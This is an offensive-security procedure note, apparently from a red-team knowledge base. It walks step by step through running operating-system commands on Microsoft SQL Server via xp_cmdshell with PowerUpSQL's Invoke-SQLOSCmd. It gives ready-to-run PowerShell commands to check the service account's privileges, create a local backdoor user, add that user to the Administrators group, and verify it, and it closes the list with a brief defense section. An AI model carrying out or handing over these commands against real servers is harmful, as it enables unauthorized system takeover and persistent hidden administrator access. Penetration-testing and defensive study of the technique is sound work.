---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/Command Execution via xp_cmdshell]]'
  - '[[tags/MSSQL Server]]'
commands:
  - '[[commands/invoke-sqloscmd-execute-whoami]]'
  - '[[commands/invoke-sqloscmd-create-local-user-backup]]'
  - '[[commands/invoke-sqloscmd-add-user-backup-to-local-administrators]]'
platforms:
  - Windows
  - SQL Server
tools:
  - '[[tools/PowerUpSQL]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# mssql-command-execution-via-xp-cmdshell-with-invoke-sqloscmd

## Summary

This procedure demonstrates how to execute arbitrary operating system commands on a Microsoft SQL Server host using the xp_cmdshell extended stored procedure via the PowerUpSQL module's Invoke-SQLOSCmd cmdlet. It allows attackers with authenticated SQL access to run commands as the SQL Server service account, enabling reconnaissance, user creation, privilege escalation, and other post-exploitation activities.

## Description

xp_cmdshell is an extended stored procedure in Microsoft SQL Server that executes operating system commands directly from SQL queries. Although disabled by default in modern versions, it can be enabled and abused if misconfigured. The PowerUpSQL toolkit provides the Invoke-SQLOSCmd PowerShell cmdlet, which connects to a SQL Server instance using provided credentials and proxies OS commands through xp_cmdshell. This technique is useful in lateral movement scenarios where SQL Server access is obtained via weak credentials, default accounts, or SQL injection. Commands run in the context of the SQL Server service, often with high privileges like SYSTEM on Windows. Potential outcomes include system reconnaissance (e.g., whoami), persistence (e.g., creating backdoor users), and further exploitation.

## Requirements

1. Authenticated access to the SQL Server instance (e.g., valid username and password like 'sa').
2. xp_cmdshell enabled on the target SQL Server (can be checked and enabled via SQL queries if privileged).
3. PowerShell environment with the PowerUpSQL module installed.
4. Network connectivity to the SQL Server instance (default port 1433 TCP).
5. Target running Microsoft SQL Server on Windows (xp_cmdshell is Windows-specific).

## Defense

- Disable xp_cmdshell using SQL: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE.
- Use least-privilege principles for SQL accounts; avoid sysadmin roles for service accounts.
- Enable SQL Server auditing for extended stored procedure usage and failed logins.
- Implement network segmentation to restrict SQL Server access to trusted hosts only.
- Monitor for anomalous command execution via Windows Event Logs (Event ID 4688 for process creation) and SQL audit logs.

## Objectives

1. Execute OS commands on the SQL Server host to perform reconnaissance (e.g., identify current user context).
2. Create and configure backdoor accounts for persistence and privilege escalation.
3. Achieve remote code execution leading to full system compromise if the SQL service runs as SYSTEM.

## Instructions

### Step 1: Load PowerUpSQL Module and Verify Connectivity

**Context**: Import the PowerUpSQL module to access the Invoke-SQLOSCmd cmdlet. This step ensures the toolkit is available and tests basic connectivity to the SQL instance before executing commands.

**Command** (Import PowerUpSQL module):
```powershell
Import-Module PowerUpSQL
```

> This loads the necessary functions. If not installed, run Install-Module PowerUpSQL first. Expected output: No errors, module imported successfully.

### Step 2: Execute Reconnaissance Command to Identify Current User Context

**Context**: Use Invoke-SQLOSCmd to run 'whoami' via xp_cmdshell. This reveals the privilege level of the SQL Server service account, which is crucial for assessing potential impact (e.g., if running as NT AUTHORITY\SYSTEM, full compromise is possible).

**Command** ([[commands/invoke-sqloscmd-execute-whoami]]):
```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command whoami
```

> Replace placeholders with actual values (e.g., -Username sa -Password Password1234 -Instance "DBSERVER\SQLEXPRESS"). This proxies the 'whoami' command through xp_cmdshell. If successful, it returns the executing user; errors indicate disabled xp_cmdshell or invalid credentials.

### Step 3: Create a Local Backdoor User

**Context**: If reconnaissance shows sufficient privileges, create a new local user account for persistence. This step adds a user named 'backup' with a known password, which can be used for future logins or lateral movement.

**Command** ([[commands/invoke-sqloscmd-create-local-user-backup]]):
```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "net user backup $_PASSWORD /add" -Verbose
```

> The -Verbose flag provides detailed output. Expected: Confirmation that the user was added (e.g., "The command completed successfully"). Verify with a follow-up 'net user' command if needed.

### Step 4: Add the Backdoor User to Local Administrators Group

**Context**: Elevate the new user's privileges by adding it to the Administrators group, enabling administrative access for further exploitation or persistence.

**Command** ([[commands/invoke-sqloscmd-add-user-backup-to-local-administrators]]):
```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "net localgroup administrators backup /add" -Verbose
```

> Similar to the previous step, expect success message. This grants admin rights to 'backup', allowing RDP or other access if firewall permits.

### Step 5: Verify User Creation and Privileges

**Context**: Run a verification command to confirm the user exists and is in the Administrators group, ensuring the execution succeeded without errors.

**Command** ([[commands/invoke-sqloscmd-execute-whoami]] ) (adapted for verification):
```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "net user backup"
```

> Or use 'net localgroup administrators' to list members. Expected: Output showing user details and group membership.
